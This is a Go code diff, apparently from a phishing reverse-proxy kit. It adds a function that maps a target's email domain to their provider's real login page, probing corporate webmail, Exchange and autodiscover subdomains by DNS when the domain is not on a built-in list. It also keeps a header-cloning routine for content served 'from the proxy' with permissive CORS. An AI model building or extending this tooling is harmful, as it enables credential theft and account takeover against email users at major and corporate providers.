@@ -1,10 +1,12 @@
 package main
 
 import (
+	"fmt"
+	"net"
 	"net/http"
+	"strings"
 )
 
-// ProviderMapping maps email domains to their actual login URLs for US, Europe, and China
 var ProviderMapping = map[string]string{
 	// US Providers
 	"gmail.com":      "https://accounts.google.com/",
@@ -44,12 +46,39 @@ var ProviderMapping = map[string]string{
 	"cpanel.net":   "https://cpanel.net/",
 }
 
+// GetTargetDomain determines the login page based on the email domain
+func GetTargetDomain(email string) string {
+	parts := strings.Split(email, "@")
+	if len(parts) < 2 {
+		return "https://accounts.google.com/"
+	}
+	domain := strings.ToLower(parts[1])
+
+	// 1. Check the known map first
+	if target, ok := ProviderMapping[domain]; ok {
+		return target
+	}
+
+	// 2. Smart DNS Fallback for custom corporate domains
+	// Try common webmail subdomains
+	subdomains := []string{"webmail", "mail", "exchange", "outlook", "autodiscover", "portal"}
+	for _, sub := range subdomains {
+		fullDomain := sub + "." + domain
+		_, err := net.LookupHost(fullDomain)
+		if err == nil {
+			return fmt.Sprintf("https://%s/", fullDomain)
+		}
+	}
+
+	// 3. Absolute Fallback
+	return fmt.Sprintf("https://%s/", domain)
+}
+
 // CloneHeaders copies critical headers from the upstream response to the client
 func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
 	if ct := src.Header.Get("Content-Type"); ct != "" {
 		dst.Header().Set("Content-Type", ct)
 	}
-	// Allow the browser to load images, scripts, and styles from the proxy
 	dst.Header().Set("Access-Control-Allow-Origin", "*")
 	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
 }
